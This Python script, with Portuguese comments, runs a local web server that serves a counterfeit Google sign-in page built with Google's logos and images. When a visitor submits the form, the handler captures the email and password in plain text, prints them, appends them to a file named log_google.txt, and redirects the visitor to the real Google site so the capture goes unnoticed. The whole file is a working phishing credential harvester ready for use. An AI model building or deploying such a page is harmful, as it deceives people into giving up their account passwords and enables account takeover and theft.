import http.server
import socketserver
import urllib.parse

# Definindo a porta em que o servidor irá rodar
PORT = 8080

# Definindo o conteúdo HTML da página com a nova imagem e o formulário de login
html_content = """
<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f2f2f2;
        }
        .image-container {
            text-align: center;
            margin-bottom: 20px;
        }
        .image-container img#google-logo {
            width: 150px; /* Largura ajustada */
            height: 50px; /* Altura ajustada */
        }
        .login-container {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
            width: 300px;
            text-align: center;
        }
        .login-container h3 {
            margin-bottom: 20px;
        }
        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ddd;
            box-sizing: border-box;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #4285f4;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-container img {
            border-radius: 50%; /* Arredonda a imagem */
            width: 100px; /* Largura ajustada */
            height: 100px; /* Altura ajustada */
            object-fit: cover; /* Ajusta o conteúdo da imagem */
        }
        .login-container #google-logo-footer {
            width: 200px; /* Largura ajustada */
            height: 100px; /* Altura ajustada */
            object-fit: contain; /* Mantém a proporção da imagem sem cortar */
            margin-bottom: 10px; /* Espaço abaixo da imagem */
        }
        .login-container h5 {
            margin-bottom: 10px; /* Espaço abaixo do texto */
            font-size: 14px; /* Ajusta o tamanho da fonte se necessário */
            color: #555; /* Ajusta a cor do texto se necessário */
        }
    </style>
</head>
<body>
    <div class="image-container">
        <h1>
            <img id="google-logo" src="https://logodownload.org/wp-content/uploads/2014/09/google-logo-1.png" alt="Logotipo do Google">
            <h3>Sign in with your Google Account</h3>
        </h1>
    </div>
    <div class="login-container">
        <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Login Image">
        <form method="post" action="/">
            <input type="text" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Entrar</button>
            
            <h5>One Google Account for everything Google</h5>
            <img id="google-logo-footer" src="https://ssl.gstatic.com/accounts/ui/logo_strip_2x.png" alt="Logotipo do Google">
        </form>
    </div>
</body>
</html>
"""

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Responde com o conteúdo HTML
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(html_content.encode("utf-8"))

    def do_POST(self):
        # Lê o comprimento do corpo da solicitação
        content_length = int(self.headers['Content-Length'])
        # Lê o corpo da solicitação
        post_data = self.rfile.read(content_length)
        # Faz o parsing dos dados do formulário
        fields = urllib.parse.parse_qs(post_data.decode('utf-8'))
        
        email = fields.get('email', [''])[0]
        password = fields.get('password', [''])[0]
        
        # Loga as credenciais no terminal e no arquivo
        log_entry = f"Email: {email}\nPassword: {password}"
        print(log_entry)
        with open("log_google.txt", "a") as log_file:
            log_file.write(log_entry + "\n")
        
        # Redireciona para o Google
        self.send_response(302)
        self.send_header('Location', 'https://www.google.com.br/')
        self.end_headers()

# Cria o servidor HTTP
with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
    print(f"Servidor rodando na porta {PORT}")
    print("Acesse o servidor em: http://127.0.0.1:8080")
    print("===========================================\n\n")
    httpd.serve_forever()
